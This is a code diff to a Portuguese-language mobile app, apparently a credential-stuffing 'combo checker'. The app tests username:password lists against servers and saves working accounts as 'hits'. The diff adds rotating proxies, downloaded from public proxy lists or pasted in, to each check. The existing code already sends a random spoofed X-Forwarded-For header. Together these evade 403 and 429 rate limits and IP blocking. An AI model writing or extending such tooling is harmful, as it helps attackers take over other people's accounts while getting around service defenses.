@@ -93,6 +93,9 @@ SESS = {}
 SESS_L = threading.Lock()
 DNS_C = {}
 DNS_L = threading.Lock()
+PROXIES = []
+PROXY_L = threading.Lock()
+PROXY_I = 0
 
 UAS = [
     'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/131.0.0.0 Mobile Safari/537.36',
@@ -110,6 +113,60 @@ def headers():
     ip = '%d.%d.%d.%d' % tuple(random.randint(1, 255) for _ in range(4))
     h['X-Forwarded-For'] = ip
     return h
+
+def next_proxy():
+    with PROXY_L:
+        if not PROXIES:
+            return None
+        global PROXY_I
+        p = PROXIES[PROXY_I % len(PROXIES)]
+        PROXY_I += 1
+        return p
+
+def parse_proxy_text(text):
+    out = []
+    for line in (text or '').splitlines():
+        line = line.strip()
+        if not line or line.startswith('#'):
+            continue
+        if '://' in line:
+            out.append(line)
+        elif '@' in line:
+            out.append('http://' + line)
+        elif line.count(':') >= 1:
+            out.append('http://' + line)
+    return out
+
+def download_proxies_online():
+    urls = [
+        'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all',
+        'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
+        'https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt',
+    ]
+    found = []
+    if not requests:
+        return found
+    for u in urls:
+        try:
+            r = requests.get(u, timeout=12)
+            if r.status_code == 200 and r.text:
+                for line in r.text.splitlines():
+                    line = line.strip()
+                    if line and not line.startswith('#') and ':' in line and ' ' not in line:
+                        if '://' not in line:
+                            line = 'http://' + line
+                        found.append(line)
+            if len(found) >= 80:
+                break
+        except Exception:
+            continue
+    seen = set()
+    uniq = []
+    for p in found:
+        if p not in seen:
+            seen.add(p)
+            uniq.append(p)
+    return uniq[:200]
 
 def session(server=None, proxy=None):
     if requests is None:
@@ -468,6 +525,24 @@ class AScanApp(App):
         body.add_widget(card)
 
         card = RCard()
+        card.add_widget(T('PROXIES', size=12, muted=True, bold=True))
+        self.lbl_proxy = T('Sem proxy (direto)', size=13, muted=True)
+        self.lbl_proxy.height = dp(26)
+        card.add_widget(self.lbl_proxy)
+        rowp = BoxLayout(size_hint_y=None, height=dp(42), spacing=dp(6))
+        bp1 = Btn('Online', kind='blue', height=dp(42))
+        bp1.bind(on_press=self.load_proxies_online)
+        bp2 = Btn('Colar', kind='dark', height=dp(42))
+        bp2.bind(on_press=self.open_paste_proxy)
+        bp3 = Btn('Limpar', kind='red', height=dp(42))
+        bp3.bind(on_press=self.clear_proxies)
+        rowp.add_widget(bp1)
+        rowp.add_widget(bp2)
+        rowp.add_widget(bp3)
+        card.add_widget(rowp)
+        body.add_widget(card)
+
+        card = RCard()
         card.add_widget(T('CONFIG', size=12, muted=True, bold=True))
         r1 = BoxLayout(size_hint_y=None, height=dp(46), spacing=dp(8))
         r1.add_widget(T('Modo', size=13, size_hint_x=0.28))
@@ -494,7 +569,7 @@ class AScanApp(App):
             ('checks', 'Checks  0'), ('hits', 'Hits  0'),
             ('ilim', 'Ilimitados  0'), ('cpm', 'CPM  0'),
             ('tempo', 'Tempo  00:00'), ('ncombo', 'Combo  0'),
-            ('errs', '403:0 429:0 TO:0'), ('dummy', ''),
+            ('errs', '403:0 429:0 TO:0'), ('px', 'Proxies  0'),
         ]:
             lb = T(v, size=12)
             lb.height = dp(24)
@@ -504,6 +579,9 @@ class AScanApp(App):
         self.sl['per'] = T('Servidores: -', size=11, muted=True)
         self.sl['per'].height = dp(36)
         card.add_widget(self.sl['per'])
+        self.sl['path'] = T('Hits: %s' % HITS_DIR, size=10, muted=True)
+        self.sl['path'].height = dp(22)
+        card.add_widget(self.sl['path'])
         body.add_widget(card)
 
         card = RCard()
@@ -546,6 +624,60 @@ class AScanApp(App):
         self.lbl_combo.color = hex_c('green')
         self.sl['ncombo'].text = 'Combo  %d' % len(items)
         self.log_msg('Combo: %s (%d)' % (name, len(items)))
+
+    def set_proxies(self, items, label):
+        global PROXIES, PROXY_I
+        with PROXY_L:
+            PROXIES = list(items)
+            PROXY_I = 0
+        n = len(items)
+        self.lbl_proxy.text = '%s  ·  %d proxies' % (label, n) if n else 'Sem proxy (direto)'
+        self.lbl_proxy.color = hex_c('green' if n else 'muted')
+        if 'px' in self.sl:
+            self.sl['px'].text = 'Proxies  %d' % n
+        self.log_msg('Proxies: %s (%d)' % (label, n))
+
+    def clear_proxies(self, *_):
+        self.set_proxies([], 'limpo')
+
+    def load_proxies_online(self, *_):
+        self.log_msg('Baixando proxies online...')
+        def work(dt):
+            try:
+                items = download_proxies_online()
+                if not items:
+                    self.log_msg('Nenhum proxy online encontrado')
+                    return
+                self.set_proxies(items, 'online')
+            except Exception as e:
+                self.log_msg('Proxy online falhou: %s' % e)
+        Clock.schedule_once(work, 0.05)
+
+    def open_paste_proxy(self, *_):
+        box = BoxLayout(orientation='vertical', spacing=dp(8), padding=dp(10))
+        box.add_widget(T('Cole ip:porta (uma por linha)', size=12, muted=True))
+        ti = TextInput(
+            hint_text='1.2.3.4:8080\nuser:pass@1.2.3.4:3128',
+            background_color=hex_c('input'),
+            foreground_color=hex_c('text'),
+            cursor_color=hex_c('blue'),
+            font_size='13sp',
+            multiline=True,
+        )
+        box.add_widget(ti)
+        btn = Btn('Carregar proxies', kind='green')
+        box.add_widget(btn)
+        pop = Popup(title='Colar proxies', content=box, size_hint=(0.94, 0.7))
+
+        def ok(_):
+            items = parse_proxy_text(ti.text)
+            if not items:
+                self.log_msg('Nenhum proxy valido')
+                return
+            self.set_proxies(items, 'colado')
+            pop.dismiss()
+        btn.bind(on_press=ok)
+        pop.open()
 
     def open_paste_combo(self, *_):
         box = BoxLayout(orientation='vertical', spacing=dp(8), padding=dp(10))
@@ -659,6 +791,7 @@ class AScanApp(App):
         _stop.clear()
         self.stats = {
             'hits': 0, 'checks': 0, 'start': time.time(),
+            'pause_acc': 0.0, 'pause_at': None,
             'err403': 0, 'err429': 0, 'timeout': 0, 'other': 0,
             'per': {s: {'ok': 0, 'hit': 0, 'err': 0, 'last': '-'} for s in servers},
         }
@@ -666,7 +799,11 @@ class AScanApp(App):
         self.btn_go.disabled = True
         for s in servers:
             self.log_msg('SRV %s' % s)
-        self.log_msg('Start %d srv | %d combo | %d thr' % (len(servers), len(self.combo_items), th))
+        self.log_msg('Hits em: %s' % HITS_DIR)
+        with PROXY_L:
+            np = len(PROXIES)
+        self.log_msg('Proxies: %d | Start %d srv | %d combo | %d thr' % (
+            np, len(servers), len(self.combo_items), th))
         self.scan_thread = threading.Thread(
             target=self._worker, args=(servers, list(self.combo_items), th), daemon=True)
         self.scan_thread.start()
@@ -687,7 +824,8 @@ class AScanApp(App):
                 except queue.Empty:
                     break
                 try:
-                    ok, data, meta = check_target(server, item)
+                    px = next_proxy()
+                    ok, data, meta = check_target(server, item, proxy=px)
                     err = meta.get('err', '')
                     code = meta.get('code', 0)
                     with _lock:
@@ -718,7 +856,7 @@ class AScanApp(App):
                             self.stats['hits'] += 1
                         tag = 'ILIM' if ilim else 'HIT'
                         Clock.schedule_once(
-                            lambda dt, s=server, u=item[0], tg=tag: self.log_msg('%s %s | %s' % (tg, s, u)), 0)
+                            lambda dt, s=server, u=item[0], tg=tag: self.log_msg('%s %s | %s  -> HITS/' % (tg, s, u)), 0)
                     else:
                         with _lock:
                             n = self.stats['checks']
@@ -756,23 +894,35 @@ class AScanApp(App):
             self.clock.cancel()
 
     def _tick(self, dt):
-        el = max(time.time() - self.stats['start'], 1)
-        cpm = (self.stats['checks'] / el) * 60
+        now = time.time()
+        pause_acc = self.stats.get('pause_acc', 0.0)
+        if self.scan_paused and self.stats.get('pause_at'):
+            pause_acc = pause_acc + (now - self.stats['pause_at'])
+        el = max(now - self.stats['start'] - pause_acc, 1)
+        cpm = (self.stats['checks'] / el) * 60 if not self.scan_paused else self.stats.get('_last_cpm', 0)
+        if not self.scan_paused:
+            self.stats['_last_cpm'] = cpm
         m, s = int(el // 60), int(el % 60)
         self.sl['checks'].text = 'Checks  %d' % self.stats['checks']
         self.sl['hits'].text = 'Hits  %d' % self.stats['hits']
         self.sl['ilim'].text = 'Ilimitados  %d' % STATS.get('hits_ilimitados', 0)
         self.sl['cpm'].text = 'CPM  %.0f' % cpm
-        self.sl['tempo'].text = 'Tempo  %02d:%02d' % (m, s)
+        self.sl['tempo'].text = 'Tempo  %02d:%02d%s' % (m, s, ' (P)' if self.scan_paused else '')
         e403 = self.stats.get('err403', 0)
         e429 = self.stats.get('err429', 0)
         eto = self.stats.get('timeout', 0)
         if 'errs' in self.sl:
             self.sl['errs'].text = '403:%d 429:%d TO:%d' % (e403, e429, eto)
+        if 'path' in self.sl:
+            self.sl['path'].text = 'Hits: %s' % HITS_DIR
+        if 'px' in self.sl:
+            with PROXY_L:
+                np = len(PROXIES)
+            self.sl['px'].text = 'Proxies  %d' % np
         if 'per' in self.sl and self.stats.get('per'):
             parts = []
             for srv, st in list(self.stats['per'].items())[:5]:
-                short = srv.split(':')[0][:16]
+                short = srv.split(':')[0][:14]
                 parts.append('%s h%d/%s' % (short, st.get('hit', 0), st.get('last', '-')))
             self.sl['per'].text = ' | '.join(parts) if parts else 'Servidores: -'
 
@@ -780,12 +930,16 @@ class AScanApp(App):
         if not self.scan_running:
             return
         if self.scan_paused:
+            if self.stats.get('pause_at'):
+                self.stats['pause_acc'] = self.stats.get('pause_acc', 0) + (time.time() - self.stats['pause_at'])
+                self.stats['pause_at'] = None
             _pause.clear()
             self.scan_paused = False
             self.btn_pause.text = 'PAUSAR'
             self.lbl_status.text = '[color=F59E0B]*[/color] Rodando'
             self.log_msg('Retomado')
         else:
+            self.stats['pause_at'] = time.time()
             _pause.set()
             self.scan_paused = True
             self.btn_pause.text = 'RETOMAR'
